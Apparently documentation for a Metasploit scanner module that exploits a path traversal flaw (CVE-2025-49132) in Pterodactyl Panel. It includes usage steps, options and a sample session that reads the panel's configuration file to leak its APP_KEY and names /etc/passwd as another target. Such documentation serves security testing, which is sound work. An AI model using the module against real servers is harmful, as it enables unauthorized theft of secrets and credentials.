## Vulnerable Application

Pterodactyl Panel is an open-source game server management panel built with PHP, React, and Go.
This module exploits a path traversal vulnerability (CVE-2025-49132) in Pterodactyl Panel versions prior to the fixed release.
The vulnerability exists in the `/locales/locale.json` endpoint. It allows an unauthenticated attacker to manipulate the `locale` parameter to traverse directories and read arbitrary files on the server (e.g., configuration files containing sensitive keys).

To set up a vulnerable environment, you can install an older version of Pterodactyl Panel using the standard installation scripts or Docker, ensuring you do not apply the patch for CVE-2025-49132.

## Verification Steps

1. Install the application.
2. Start msfconsole.
3. Do: `use auxiliary/scanner/http/pterodactyl_traversal_cve_2025_49132`
4. Do: `set RHOSTS [ip]`
5. Do: `set DEPTH [depth]` (default is 2, adjust based on installation path).
6. Do: `run`
7. You should see the module report the host as vulnerable and save the file content to loot.

## Options

### DEPTH

The traversal depth required to reach the root directory.
Defaults to `2`, which is sufficient for standard Pterodactyl installations where the path is relative to the `public` directory. If the application is deployed in a deeper subdirectory, increase this value.

### FILE

The specific file to retrieve from the target server.
Defaults to `config`, which targets the Pterodactyl configuration file (often named `config` or `.env` depending on setup) to verify the vulnerability and leak the `APP_KEY`. Testers can change this to `/etc/passwd` or other sensitive files if the depth is adjusted accordingly.

## Scenarios

### Successful Scan on Pterodactyl Panel

This scenario demonstrates reading the configuration file from a vulnerable Pterodactyl instance running locally.
```
msf > use auxiliary/scanner/http/pterodactyl_traversal_cve_2025_49132
msf auxiliary(scanner/http/pterodactyl_traversal_cve_2025_49132) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf auxiliary(scanner/http/pterodactyl_traversal_cve_2025_49132) > set RPORT 80
RPORT => 80
msf auxiliary(scanner/http/pterodactyl_traversal_cve_2025_49132) > set DEPTH 2
DEPTH => 2
msf auxiliary(scanner/http/pterodactyl_traversal_cve_2025_49132) > run
[+] 127.0.0.1:80 - Vulnerable! Found Pterodactyl configuration.
[+] 127.0.0.1:80 - Config saved to: /root/.msf4/loot/20251216220817_default_127.0.0.1_pterodactyl.conf_821780.bin
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
